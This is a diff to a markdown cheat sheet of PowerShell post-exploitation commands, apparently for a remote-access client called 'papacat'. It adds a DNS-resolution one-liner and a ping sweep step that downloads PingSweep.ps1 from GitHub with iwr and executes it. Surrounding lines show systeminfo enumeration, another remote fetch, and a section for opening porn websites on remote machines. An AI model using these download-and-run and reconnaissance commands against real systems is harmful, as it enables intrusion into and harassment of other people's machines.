@@ -124,6 +124,19 @@ iwr -uri "https://gist.githubusercontent.com/r00t-3xp10it/c328acda60dcfa5460888e
 systeminfo|Out-File systeminfo.log -force;echo "";Get-Content systeminfo.log|findstr "Host OS Registered Owner: Locale:"|findstr /V /C:"Registered Organization:"|findstr /V /C:"BIOS Version:"|findstr /V /C:"OS Build Type:"|findstr /V /C:"Input Locale:";echo "";Start-Sleep -Seconds 1;Remove-Item systeminfo.log -force
 ```
 
+#### Retrieve remote DNS entrys (resolve hostnames)
+```powershell
+$dnstable = New-Object System.Data.DataTable;$dnstable.Columns.Add("RemoteAddress")|Out-Null;$dnstable.Columns.Add("DnsHostName")|Out-Null;ForEach($TokenItem in $DnsHostsList){$ResolveNames = (Resolve-DnsName $TokenItem -EA SilentlyContinue).NameHost;$dnstable.Rows.Add("$TokenItem","$ResolveNames")|Out-Null};$dnstable|Format-Table -AutoSize
+```
+
+#### Retrieve active ip address of local lan (ping sweep)
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/PingSweep.ps1" -outfile "PingSweep.ps1";powershell -file PingSweep.ps1 -Action 'Enum'
+```
+**remark:** <b><i>PingSweep.ps1</b></i> will run attached to <b><i>papacat</b></i> process {client} so.. its advice to wait 2\3 minuts for module to finish working.
+
+<br />
+
 #### Stop\Start remote processes
 ```powershell
 # Open porn websites
